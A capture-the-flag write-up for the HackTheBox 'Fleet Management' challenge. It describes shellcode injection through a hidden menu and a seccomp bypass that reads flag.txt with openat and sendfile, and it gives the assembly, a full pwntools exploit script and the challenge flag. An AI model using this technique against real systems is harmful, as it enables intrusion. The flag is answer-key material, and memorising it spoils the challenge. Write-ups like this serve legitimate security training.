# Fleet Management
> Write-up author: jon-brandy
## DESCRIPTION:
Reading through an Underground Intergalactic hacking forum Bonnie stumbles upon a post talking about a backdoor in the Gold Fang’s Spaceship Fleet Management System. 
There is a note about a twist added by the author to prevent anyone from using the backdoor. 
Will Bonnie achieve to gain access to Gold Fang’s internal network and retrieve precious documents?
## HINT:
- NONE
## STEPS:
1. In this challenge we're given a 64 bit binary, dynamically linked, and not stripped.

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/01e498a8-ad99-4299-8d88-13f78a1cc1d6)


> BINARY PROTECTIONS

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/2de5a421-f79f-4f92-ae29-8249a21a1476)


2. After decompiled the binary, it looks like there's a hidden menu which calls the **beta_feature()** function.

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/1ead0cbe-4f84-4235-ad05-5931745906c3)


3. There's a chance we can do shellcode injection even though the NX are disabled.

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/c624695a-1467-4a47-88fd-cc9bf0dcaa64)


4. But the problem is, we have `seccomp()`. (`skid_check()`)

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/8e136aaf-b7b8-4b49-9251-7b0c2395b8c6)


5. To be precise what are the seccomp applied, we can run:

```
sudo seccomp-tools dump ./fleet_management
```

6. Then open menu number 9 and input random strings.

> RESULT

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/f852dc59-3304-43c6-9618-4abd9788615b)


7. The interesting part here, the binary using **openat()** which is more secure than **open()**, it does took me a while to solved this.
8. Since there are seccomp, hence the objective here is to cat the flag rather spawn the shell.
9. To do that we can utilize `sendfile` & `openat`.
10. Here are the asm code we want to inject:

```asm
xor rdx, rdx ; set rdi to 0
push rdx ; push it to the stack
mov rsi, 0x7478742e67616c66 ; stores flag.txt
push rsi ; push it to the stack
mov rsi, rsp ; move what's on the stack to rsi (set filename address to stack address) (need to mov from stack to rsi)
mov rdi, -100 ; set rdi as file descriptor (fd) pointing to AT_FDCWD
mov rax, 257 ; do the sys_openat()
syscall

xor rdi, rdi ; set rdi to 0
xor rdx, rdx ; set rdx to 0
mov rsi, rax ; move rax, rsi (set file descriptor [fd] to openat() result
mov r10, 0x100 ; set length to read the flag.txt
mov rax, 40 ; do the sys_sendfile()
syscall
```

11. Here's the full script:

```py
from pwn import *

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

exe = './fleet_management'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'DEBUG'

sh = start()

sh.sendlineafter(b'do? ', b'9')

shell = """
xor rdx, rdx
push rdx
mov rsi, 0x7478742e67616c66
push rsi
mov rsi, rsp
mov rdi, -100
mov rax, 257
syscall

xor rdi, rdi
xor rdx, rdx
mov rsi, rax
mov r10, 0x100
mov rax, 40
syscall
"""
shellcode = asm(shell)
sh.sendline(shellcode)

sh.interactive()
```

> RUN SCRIPT REMOTELY

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/327249f1-3d5f-41d6-8ab9-c2cf08fd5afd)

12. Got the flag!

## FLAG
```
HTB{sh3llc0d3_45_4_b4ckd00r}
```
